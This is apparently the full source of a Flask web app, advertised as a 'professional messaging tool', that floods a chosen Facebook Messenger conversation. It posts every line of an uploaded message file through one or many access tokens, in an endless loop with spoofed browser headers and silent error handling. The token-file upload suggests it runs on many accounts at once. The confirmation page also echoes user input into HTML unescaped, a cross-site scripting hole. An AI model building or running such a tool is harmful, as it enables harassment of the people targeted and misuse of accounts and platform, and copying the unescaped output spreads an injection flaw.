from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import uuid

app = Flask(__name__)
app.debug = False  # Production mode

# Flask logging disable
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Global dictionaries - no automatic cleanup
stop_events = {}
threads = {}
active_tasks = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers)
                    # No logging to reduce load
                except Exception:
                    # Silent error handling
                    pass
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        thread_id = request.form.get('threadId')
        kidx = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        
        # Handle tokens
        access_tokens = []
        if token_option == 'single':
            single_token = request.form.get('singleToken')
            if single_token:
                access_tokens = [single_token.strip()]
        else:
            token_file = request.files.get('tokenFile')
            if token_file:
                token_content = token_file.read().decode('utf-8')
                access_tokens = [token.strip() for token in token_content.splitlines() if token.strip()]
        
        # Handle messages file
        messages = []
        txt_file = request.files.get('txtFile')
        if txt_file:
            message_content = txt_file.read().decode('utf-8')
            messages = [msg.strip() for msg in message_content.splitlines() if msg.strip()]
        
        if access_tokens and messages and thread_id:
            # Generate unique task ID
            task_id = str(uuid.uuid4())[:8]
            stop_event = Event()
            stop_events[task_id] = stop_event
            
            # Start the message sending thread
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, kidx, time_interval, messages, task_id))
            thread.daemon = True
            threads[task_id] = thread
            active_tasks[task_id] = {
                'start_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'status': 'RUNNING',
                'thread_id': thread_id,
                'kidx': kidx,
                'messages_count': len(messages),
                'tokens_count': len(access_tokens)
            }
            thread.start()
            
            return f'''
            <div class="alert alert-success mt-3">
                <h5><i class="fas fa-check-circle"></i> Task Started Successfully!</h5>
                <p><strong>Task ID:</strong> {task_id}</p>
                <p><strong>Thread ID:</strong> {thread_id}</p>
                <p><strong>Sender Name:</strong> {kidx}</p>
                <p><strong>Time Interval:</strong> {time_interval} seconds</p>
                <p><strong>Tokens:</strong> {len(access_tokens)} | <strong>Messages:</strong> {len(messages)}</p>
                
                <div class="mt-3">
                    <form method="POST" action="/stop" style="display:inline;">
                        <input type="hidden" name="taskId" value="{task_id}">
                        <button type="submit" class="btn btn-danger btn-sm">
                            <i class="fas fa-stop"></i> Stop This Task
                        </button>
                    </form>
                    <a href="/" class="btn btn-primary btn-sm">
                        <i class="fas fa-plus"></i> Start New Task
                    </a>
                </div>
            </div>
            '''
    
    # Show active tasks count
    active_count = sum(1 for task in active_tasks.values() if task['status'] == 'RUNNING')
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NIMCHAND - PROFESSIONAL MESSAGING TOOL</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    body {
      background: linear-gradient(135deg, #0c2461, #1e3799, #4a69bd);
      background-attachment: fixed;
      color: white;
      min-height: 100vh;
    }
    .container {
      max-width: 450px;
      background: rgba(0, 0, 0, 0.85);
      border-radius: 15px;
      padding: 30px;
      margin-top: 20px;
      margin-bottom: 20px;
      box-shadow: 0 0 30px rgba(255, 165, 0, 0.4);
      border: 1px solid rgba(255, 165, 0, 0.3);
    }
    .form-control {
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 165, 0, 0.5);
      color: white;
      border-radius: 8px;
      transition: all 0.3s ease;
    }
    .form-control:focus {
      background: rgba(255, 255, 255, 0.15);
      border-color: #ffd700;
      box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
      color: white;
    }
    .form-label {
      color: #ffa500;
      font-weight: bold;
      margin-bottom: 8px;
    }
    .header h1 {
      color: #ffd700;
      text-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
      font-weight: bold;
      font-size: 2.5rem;
      margin-bottom: 5px;
    }
    .header p {
      color: #ffa500;
      font-size: 1.1rem;
    }
    .btn-submit {
      background: linear-gradient(45deg, #ff8a00, #ff0080);
      border: none;
      border-radius: 8px;
      font-weight: bold;
      padding: 15px;
      margin-top: 20px;
      font-size: 1.1rem;
      transition: all 0.3s ease;
    }
    .btn-submit:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
    }
    .footer {
      margin-top: 25px;
      color: rgba(255, 255, 255, 0.8);
    }
    .footer a {
      color: #ffd700;
      text-decoration: none;
      transition: color 0.3s ease;
    }
    .footer a:hover {
      color: #fff;
      text-decoration: underline;
    }
    .stats-box {
      background: rgba(255, 165, 0, 0.2);
      border: 1px solid rgba(255, 165, 0, 0.5);
      border-radius: 10px;
      padding: 15px;
      margin-bottom: 20px;
      text-align: center;
    }
    .stats-number {
      font-size: 2rem;
      font-weight: bold;
      color: #ffd700;
    }
    .task-counter {
      position: fixed;
      top: 20px;
      right: 20px;
      background: rgba(255, 0, 0, 0.8);
      color: white;
      padding: 10px 15px;
      border-radius: 20px;
      font-weight: bold;
      z-index: 1000;
    }
  </style>
</head>
<body>
  {% if active_count > 0 %}
  <div class="task-counter">
    <i class="fas fa-play-circle"></i> {{ active_count }} Active
  </div>
  {% endif %}

  <header class="header text-center mt-4">
    <h1>NIMCHAND</h1>
    <p>PROFESSIONAL MESSAGING SOLUTION</p>
  </header>
  
  <div class="container">
    <div class="stats-box">
      <div class="stats-number">{{ active_count }}</div>
      <div>Active Tasks Running</div>
    </div>

    <form method="POST" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Multiple Tokens (File)</option>
        </select>
      </div>
      
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">Facebook Token</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="Enter your access token">
      </div>
      
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">Token File Upload</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
        <small class="text-muted">TXT file with one token per line</small>
      </div>
      
      <div class="mb-3">
        <label for="threadId" class="form-label">Conversation ID</label>
        <input type="text" class="form-control" id="threadId" name="threadId" placeholder="Target thread ID" required>
      </div>
      
      <div class="mb-3">
        <label for="kidx" class="form-label">Sender Identity</label>
        <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Your display name" required>
      </div>
      
      <div class="mb-3">
        <label for="time" class="form-label">Delay Time (Seconds)</label>
        <input type="number" class="form-control" id="time" name="time" placeholder="Interval between messages" required min="1">
      </div>
      
      <div class="mb-3">
        <label for="txtFile" class="form-label">Messages File</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
        <small class="text-muted">Upload TXT file containing messages (one per line)</small>
      </div>
      
      <button type="submit" class="btn btn-submit w-100">
        <i class="fas fa-rocket"></i> LAUNCH MESSAGING TASK
      </button>
    </form>
    
    <!-- Active Tasks Management -->
    {% if active_tasks %}
    <div class="mt-4">
      <h5 class="text-warning text-center"><i class="fas fa-tasks"></i> Task Management</h5>
      <div class="text-center">
        <a href="/tasks" class="btn btn-outline-warning btn-sm">
          <i class="fas fa-cog"></i> Manage Active Tasks
        </a>
      </div>
    </div>
    {% endif %}
  </div>
  
  <footer class="footer text-center">
    <p><strong>NIMCHAND</strong> - Professional Messaging Tool</p>
    <p>Continuous Operation | No Auto Stop | Manual Control</p>
    <div class="mt-3">
      <a href="https://wa.me/+919354720853" class="me-3">
        <i class="fab fa-whatsapp"></i> WhatsApp Support
      </a>
      <a href="https://www.facebook.com/S9HIL2.0">
        <i class="fab fa-facebook"></i> Facebook Page
      </a>
    </div>
  </footer>

  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption === 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
    
    document.addEventListener('DOMContentLoaded', function() {
      toggleTokenInput();
    });
  </script>
</body>
</html>
''', active_count=active_count, active_tasks=active_tasks)

@app.route('/tasks')
def show_tasks():
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Manage Tasks - NIMCHAND</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    body {
      background: linear-gradient(135deg, #0c2461, #1e3799, #4a69bd);
      color: white;
      min-height: 100vh;
    }
    .container {
      max-width: 800px;
      background: rgba(0, 0, 0, 0.9);
      border-radius: 15px;
      padding: 30px;
      margin-top: 20px;
      margin-bottom: 20px;
    }
    .task-card {
      background: rgba(255, 165, 0, 0.1);
      border: 1px solid rgba(255, 165, 0, 0.5);
      border-radius: 10px;
      padding: 20px;
      margin-bottom: 15px;
    }
    .task-running {
      border-left: 5px solid #28a745;
    }
    .task-stopped {
      border-left: 5px solid #dc3545;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="text-center text-warning mb-4">
      <i class="fas fa-cogs"></i> Task Management
    </h1>
    
    <div class="text-center mb-4">
      <a href="/" class="btn btn-primary">
        <i class="fas fa-arrow-left"></i> Back to Home
      </a>
    </div>

    {% if active_tasks %}
      {% for task_id, task in active_tasks.items() %}
      <div class="task-card {% if task.status == 'RUNNING' %}task-running{% else %}task-stopped{% endif %}">
        <div class="row">
          <div class="col-md-8">
            <h5 class="text-warning">Task ID: {{ task_id }}</h5>
            <p><strong>Status:</strong> 
              {% if task.status == 'RUNNING' %}
                <span class="text-success"><i class="fas fa-play-circle"></i> RUNNING</span>
              {% else %}
                <span class="text-danger"><i class="fas fa-stop-circle"></i> STOPPED</span>
              {% endif %}
            </p>
            <p><strong>Thread ID:</strong> {{ task.thread_id }}</p>
            <p><strong>Sender:</strong> {{ task.kidx }}</p>
            <p><strong>Started:</strong> {{ task.start_time }}</p>
            <p><strong>Tokens:</strong> {{ task.tokens_count }} | <strong>Messages:</strong> {{ task.messages_count }}</p>
          </div>
          <div class="col-md-4 text-end">
            {% if task.status == 'RUNNING' %}
            <form method="POST" action="/stop">
              <input type="hidden" name="taskId" value="{{ task_id }}">
              <button type="submit" class="btn btn-danger btn-lg">
                <i class="fas fa-stop"></i> STOP TASK
              </button>
            </form>
            {% else %}
            <button class="btn btn-secondary btn-lg" disabled>
              <i class="fas fa-ban"></i> STOPPED
            </button>
            {% endif %}
          </div>
        </div>
      </div>
      {% endfor %}
    {% else %}
      <div class="text-center py-5">
        <h3 class="text-muted">No Active Tasks</h3>
        <p class="text-muted">Start a new task from the home page</p>
        <a href="/" class="btn btn-primary mt-3">Start New Task</a>
      </div>
    {% endif %}
  </div>
</body>
</html>
''', active_tasks=active_tasks)

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        if task_id in active_tasks:
            active_tasks[task_id]['status'] = 'STOPPED'
        return '''
        <div class="alert alert-success text-center">
            <h4><i class="fas fa-check-circle"></i> Task Stopped Successfully!</h4>
            <p>Task ID: ''' + task_id + ''' has been stopped.</p>
            <div class="mt-3">
                <a href="/tasks" class="btn btn-primary me-2">Manage Tasks</a>
                <a href="/" class="btn btn-warning">Home Page</a>
            </div>
        </div>
        '''
    else:
        return '''
        <div class="alert alert-danger text-center">
            <h4><i class="fas fa-exclamation-triangle"></i> Task Not Found</h4>
            <p>The specified task could not be found.</p>
            <a href="/tasks" class="btn btn-primary mt-2">Back to Tasks</a>
        </div>
        '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

